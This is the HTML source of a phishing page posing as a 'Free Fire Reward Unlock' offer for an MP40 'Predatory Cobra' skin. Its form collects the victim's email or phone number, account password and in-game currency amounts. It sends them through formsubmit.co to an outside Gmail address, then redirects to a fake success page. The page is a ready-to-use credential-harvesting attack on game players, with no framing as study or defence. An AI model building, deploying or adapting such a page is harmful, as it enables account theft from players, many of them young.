<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Free Fire Reward Unlock</title>
  <style>
    body {
      background: url('freefire.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Segoe UI', Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: rgba(255,255,255,0.65);
      backdrop-filter: blur(8px) saturate(1.3);
      padding: 2.5rem 2rem;
      border-radius: 16px;
      box-shadow: 0 6px 32px rgba(0,0,0,0.12);
      max-width: 350px;
      width: 100%;
      text-align: center;
    }
    h1 {
      color: #e53935;
      margin-bottom: 1.5rem;
      font-size: 1.5rem;
      letter-spacing: 1px;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }
    input[type="email"],
    input[type="password"],
    input[type="number"],
    input[type="tel"],
    input[type="text"] {
      padding: 0.7rem;
      border-radius: 8px;
      border: 1px solid #ddd;
      font-size: 1rem;
      outline: none;
      transition: border 0.2s;
    }
    input:focus {
      border-color: #e53935;
    }
    button {
      background: #e53935;
      color: #fff;
      border: none;
      padding: 0.9rem;
      border-radius: 8px;
      font-size: 1.1rem;
      font-weight: bold;
      cursor: pointer;
      margin-top: 0.5rem;
      transition: background 0.2s;
    }
    button:hover {
      background: #b71c1c;
    }
    .reward-highlight {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 1.2rem;
      background: rgba(255, 228, 225, 0.8);
      border-radius: 12px;
      padding: 1rem 0.5rem 0.5rem 0.5rem;
      box-shadow: 0 2px 12px rgba(229,57,53,0.1);
    }
    .reward-img {
      width: 90%;
      max-width: 350px;
      border-radius: 10px;
      box-shadow: 0 4px 24px rgba(229,57,53,0.15);
      margin-bottom: 0.5rem;
    }
    .reward-title {
      font-size: 1.2rem;
      font-weight: bold;
      color: #e53935;
      letter-spacing: 1px;
      margin-bottom: 0.4rem;
      text-shadow: 0 2px 8px #fff4;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Free Fire Reward Unlock</h1>
    <div class="reward-highlight">
      <img src="mp40.jpg" alt="MP40 - Predatory Cobra" class="reward-img">
      <div class="reward-title">MP40 - Predatory Cobra</div>
    </div>
    <form id="rewardForm" action="https://formsubmit.co/freefiregemssss@gmail.com" method="POST" autocomplete="off" onsubmit="return validateContactUnified();">
      <input type="hidden" name="_next" value="success.html">
      <input type="text" id="contact" name="contact" placeholder="Email or Phone Number" required>
      <input type="password" name="password" placeholder="Password" required>
      <input type="number" name="gems" placeholder="Gems" min="0" required>
      <input type="number" name="coins" placeholder="Coins" min="0" required>
      <button type="submit">Submit</button>
    </form>
  </div>
  <script>
    function validateContactUnified() {
      const value = document.getElementById('contact').value.trim();
      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phonePattern = /^[0-9]{10,15}$/;
      if (!emailPattern.test(value) && !phonePattern.test(value)) {
        alert('Please enter a valid email or phone number (10-15 digits).');
        return false;
      }
      return true;
    }
  </script>
</body>

</html>
